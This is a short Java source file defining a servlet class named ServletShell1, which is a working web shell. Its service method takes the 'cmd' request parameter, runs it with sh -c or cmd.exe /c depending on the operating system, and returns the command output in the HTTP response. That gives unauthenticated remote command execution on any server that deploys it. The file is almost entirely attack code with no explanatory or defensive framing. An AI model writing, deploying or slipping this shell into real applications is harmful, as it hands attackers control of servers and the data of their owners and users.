package cn.safe6.servlet;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class ServletShell1 implements Servlet {
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        if (servletRequest.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", servletRequest.getParameter("cmd")} : new String[]{"cmd.exe", "/c", servletRequest.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            System.out.println(output);
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
        }
    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {

    }
}
